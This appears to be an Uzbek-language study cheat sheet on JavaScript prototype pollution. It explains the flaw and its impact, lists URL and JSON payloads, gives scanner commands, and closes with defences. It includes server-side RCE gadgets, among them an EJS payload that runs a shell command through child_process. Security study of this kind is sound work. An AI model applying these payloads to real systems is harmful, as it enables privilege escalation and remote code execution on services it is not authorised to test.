# Prototype Pollution

> Lab yechimlari (PortSwigger'ning 10 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
JavaScript'da deyarli hamma obyekt `Object.prototype` dan meros oladi. Agar ilova sening
ma'lumotingni obyekt kalitlariga rekursiv birlashtirsa (merge/clone/`JSON` → obyekt), sen
maxsus `__proto__` (yoki `constructor.prototype`) kaliti orqali **global prototype'ga** xususiyat
qo'sha olasan. U xususiyat shu daqiqadan boshlab **HAR BIR obyektda** paydo bo'ladi.

**Ildiz sabab:** xavfsiz bo'lmagan recursive merge `__proto__`/`constructor`/`prototype` kalitlarini
oddiy kalit deb qabul qiladi. Oqibat — ilova "bu xususiyat yo'q" deb o'ylagan joyda endi sen
qo'ygan qiymat turadi (masalan `isAdmin`, yoki script `src`, yoki Node child-process argumenti).

## Qanday ishlaydi (asos)
```js
obj.__proto__.polluted = "x";
({}).polluted   // "x" — butunlay boshqa, bo'sh obyektда ham paydo bo'ldi
```

## Turlari
- **Client-side** — brauzer JS'da pollution → gadget orqali **DOM XSS**, logic/auth bypass.
  Source: URL query/hash, JSON. Gadget: `<script src>`, `eval`, `setTimeout` config.
- **Server-side (Node.js)** — JSON body merge → prototype pollution → gadget orqali **auth bypass**
  (`isAdmin`), **RCE** (`execArgv`, `shell`/`input`, EJS `outputFunctionName`), yoki **DoS**.
- **Vektor bo'yicha**: `__proto__[x]`, `__proto__.x`, `constructor.prototype.x`, obfuscated
  (`__pro__proto__to__` — non-recursive filterni aylanib).

## Oqibatlar (IMPACT)
- **Client**: DOM XSS → cookie/ATO; mavjud himoyani (sanitizer) aylanib o'tish.
- **Server**: `isAdmin:true` bilan privilege escalation; child_process gadget bilan **RCE** (Critical);
  javobni buzib DoS.
> Node'da RCE gadget topilsa **Critical**. Client-side XSS gadget bilan High.

## Payloadlar
```
# URL / query
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes

# JSON body
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
```

## Aniqlash
```js
// Client (DevTools console):
Object.prototype.polluted      // undefined bo'lmasa → pollution bor

// Server (xatti-harakat o'zgarishi):
{"__proto__":{"status":510}}       → keyingi javob 510 → pollution
{"__proto__":{"json spaces":10}}   → Express JSON formatlanadi
```

## Server-side RCE gadget (Node)
```json
{"__proto__":{"argv0":"node","NODE_OPTIONS":"--require /proc/self/environ"}}
// EJS gadget:
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');x"}}
```

## TOOLLAR

### Burp DOM Invader — client-side PP podshosi
```
Burp brauzer → DOM Invader → "Prototype pollution" yoqib qo'y → sahifaga kir
```
> Source'dan prototype'gacha oqimni avtomat topadi va XSS'ga olib keladigan gadget'ni ham ko'rsatadi.

### ppmap — client-side PP skaner
```bash
ppmap -u "https://target.com/?FUZZ"
```
> URL'ni olib, `__proto__` payloadlarini sinab, zaif gadget'ni aniqlaydi.

### ppfuzz — tez PP fuzzer (Rust)
```bash
ppfuzz -l urls.txt
```
> Ko'p URL'ni bir yo'la prototype pollution uchun tekshiradi.

### Burp "Server-Side Prototype Pollution Scanner" (James Kettle)
```
Burp extension → JSON endpointni skan qil → "status/json spaces" texnikasi bilan
```
> DoS'siz, xatti-harakat o'zgarishidan server-side PP'ni aniqlaydi.

### nuclei — ma'lum PP CVE
```bash
nuclei -l urls.txt -tags prototype-pollution
```
> Ma'lum kutubxona PP teshiklarini tez tekshiradi.

## PoC
Client: `Object.prototype` ifloslangani + XSS gadget. Server: `status`/`json spaces`
gadget bilan javob o'zgarishi, RCE bo'lsa `id`.

## Himoya
`__proto__`/`constructor`/`prototype` kalitlarini rad et, `Object.create(null)`,
`Object.freeze(Object.prototype)`, `Map` ishlat, schema validation.
